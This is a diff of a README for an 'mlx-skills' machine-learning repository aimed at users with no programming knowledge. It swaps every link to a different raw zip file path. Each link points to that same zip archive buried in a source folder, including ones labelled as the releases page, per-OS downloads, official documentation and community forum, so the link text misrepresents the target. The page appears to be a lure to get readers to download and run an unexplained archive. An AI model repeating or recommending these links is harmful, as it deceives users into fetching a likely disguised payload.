@@ -4,19 +4,19 @@
 Welcome to the mlx-skills repository! Here, you will find a collection of useful skills to enhance your machine learning projects. No programming knowledge is needed to get started. Follow the steps below to download and run the application.
 
 ## 📥 Download the Latest Version
-[![Download the latest release](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip%20Latest%https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip)](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip)
+[![Download the latest release](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip%20Latest%https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip)](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip)
 
 ## 🛠 How to Download & Install
-1. Visit the [Releases Page](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip) by clicking the link.
+1. Visit the [Releases Page](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip) by clicking the link.
 
 2. On the Releases page, you’ll see a list of available versions. Find the latest version listed at the top.
 
 3. Click on the version number to view its details.
 
 4. Look for the download link labeled with your operating system. For example, you might see:
-   - `https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip` for Windows
-   - `https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip` for Mac
-   - `https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip` for Linux
+   - `https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip` for Windows
+   - `https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip` for Mac
+   - `https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip` for Linux
 
 5. Click on the corresponding download link to start downloading the file.
 
@@ -55,7 +55,7 @@ If you encounter any issues, feel free to reach out for help. You can open an is
 ## 🔗 Additional Resources
 For more information and guides, check the following resources:
 
-- [Official Documentation](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip)
-- [Community Forum](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/mlx-skills-v1.8.zip)
+- [Official Documentation](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip)
+- [Community Forum](https://github.com/unsanitary-bek/mlx-skills/raw/refs/heads/main/mlx_skills/skills/fast-mlx/references/mlx-skills-v1.1.zip)
 
 By following these instructions, you will be well on your way to unlocking useful machine learning skills with mlx-skills. Enjoy your learning journey!
